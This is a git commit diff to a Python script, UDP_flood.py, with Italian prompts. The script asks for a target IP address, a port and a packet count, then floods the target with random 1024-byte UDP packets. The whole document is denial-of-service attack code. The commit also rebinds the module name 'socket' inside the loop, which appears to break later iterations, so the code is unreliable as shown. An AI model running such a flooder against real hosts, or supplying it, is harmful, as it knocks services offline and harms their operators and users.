abebbfbbb2bb87dbfd58397019f329cf65edc7b8
skemasche <116719584+skemasche@users.noreply.github.com>
2022-11-08 17:31:00 +0100

    Update UDP_flood.py

--- UDP_flood.py
+++ UDP_flood.py
@@ -5,13 +5,14 @@ ip = input("Inserire indirizzo ip: ")
 porta =int( input("\n inserire porta:"))
 npak = int( input("\n inserire il numero di pacchetti da inviare:"))
 bytes = os.urandom(1024)
-socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
 puntapak= int(0)
 while 1 == 1:
 	try:
 		if puntapak > npak:
 			quit()
 		else:
+			socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			socket.sendto(bytes,(ip, porta))
 			puntapak = puntapak+1
 			print (puntapak, ip, porta)
